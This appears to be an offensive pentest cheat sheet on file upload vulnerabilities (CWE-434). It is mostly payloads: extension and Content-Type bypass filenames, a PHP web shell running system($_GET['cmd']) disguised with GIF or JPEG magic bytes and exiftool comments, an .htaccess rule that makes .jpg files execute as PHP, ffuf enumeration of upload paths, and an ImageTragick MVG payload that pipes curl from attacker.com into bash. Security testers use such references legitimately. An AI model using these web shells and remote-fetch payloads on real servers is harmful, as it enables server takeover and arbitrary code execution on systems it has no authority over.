# File Upload Vulnerabilities

**CWE:** CWE-434 | **OWASP:** A03:2021

---

## Testing Approach

```
Goal: Upload a file that executes server-side code,
      or access files other users uploaded.
```

---

## Extension Bypass Techniques

```bash
# Double extension
shell.php.jpg
shell.jpg.php

# Case variation
shell.PHP
shell.PhP
shell.pHp

# Special extensions
shell.php5
shell.php7
shell.phtml
shell.pht
shell.shtml
shell.asa         # IIS
shell.asax        # ASP.NET
shell.asp
shell.aspx
shell.jsp
shell.jspx

# Null byte (PHP < 5.3)
shell.php%00.jpg
shell.php\x00.jpg

# Path traversal in filename
../../shell.php
../../../var/www/html/shell.php

# Double dot bypass
shell.php.

# Windows NTFS alternate data streams
shell.php::$DATA
```

---

## Content-Type Bypass

```bash
# Change Content-Type header to bypass server-side MIME check
Content-Type: image/jpeg       # Was: application/x-php
Content-Type: image/png
Content-Type: image/gif

# GIF magic bytes with PHP (GIF89a bypass)
GIF89a
<?php system($_GET['cmd']); ?>

# Image with embedded PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

---

## Magic Bytes Reference

| Type | Magic Bytes (Hex) | ASCII |
|------|-------------------|-------|
| JPEG | FF D8 FF | ÿØÿ |
| PNG | 89 50 4E 47 | .PNG |
| GIF | 47 49 46 38 | GIF8 |
| PDF | 25 50 44 46 | %PDF |
| ZIP | 50 4B 03 04 | PK.. |

```bash
# Prepend magic bytes to PHP shell
printf '\xFF\xD8\xFF' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

---

## Finding the Upload Path

```bash
# Check response for file path
# Check X-File-Path header
# Check JSON response: {"url": "/uploads/abc123.jpg"}

# If path not disclosed:
# Common upload directories
ffuf -u https://target.com/FUZZ/shell.php \
  -w upload_dirs.txt -mc 200

# Common paths:
/uploads/, /files/, /media/, /images/, /assets/,
/content/, /static/uploads/, /user_uploads/
```

---

## .htaccess Upload (Apache)

```bash
# Upload .htaccess to allow PHP execution in upload dir
# File: .htaccess
AddType application/x-httpd-php .jpg

# Then upload shell.jpg and access it as PHP
```

---

## ImageMagick RCE (ImageTragick)

```bash
# If server uses ImageMagick to process images
# MVG polyglot
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|curl http://attacker.com/shell.sh | bash")'
pop graphic-context

# Save as exploit.mvg or exploit.svg and upload
```
